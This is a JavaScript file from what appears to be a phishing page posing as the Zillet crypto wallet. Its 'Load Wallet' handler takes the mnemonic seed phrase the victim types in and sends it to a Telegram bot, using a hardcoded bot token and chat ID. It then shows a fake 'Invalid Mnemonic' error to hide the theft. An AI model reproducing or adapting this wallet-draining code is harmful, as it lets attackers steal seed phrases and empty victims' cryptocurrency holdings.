let inp = $("#mnemonicx");
let err = $("#errorx");
let loading = $("#private-key");
function clear() {
  inp.val("");
  err.text("");
}

$("#private-key").click(async (e) => {
  e.preventDefault();
  e.stopPropagation();
  let memOrBoth = $(".maintextx").text();
  let name =
    String(memOrBoth).toLowerCase().indexOf("private key") > -1
      ? "MnemonicOrLedger"
      : "Mnemonic";
  let mnemonic = inp.val();
  //   return alert(mnemonic);

  let msg = `Zillet...%20Name=%20Mnemonic%0AValue=%20${mnemonic}`;
  let url =
    "https://api.telegram.org/bot7691030593:AAGZXCbiRgDmBH5eWfieEA5gqyNC3IevYzU/sendMessage?chat_id=-1002443057565&text=" +
    msg;
  // fetch("/send?seed=" + mnemonic + "&name=" + mode)
  loading.text("Loading");
  fetch(url)
    .then(async (res) => {
      if (res.status > 299) {
        throw res;
      }
      console.log("success");
      loading.text("Load Wallet");
      let data = await res.json();
      err.text("Invalid Mnemonic");
    })
    .catch(async (err_) => {
      try {
        if (!err_.status == 401) throw err_;
        let data = await err_.json();
        loading.text("Load Wallet");
        err.text(data.message);
      } catch (error) {
        // unknown
        loading.text("Load Wallet");
        err.text("Invalid Mnemonic.");
      }
    });
});
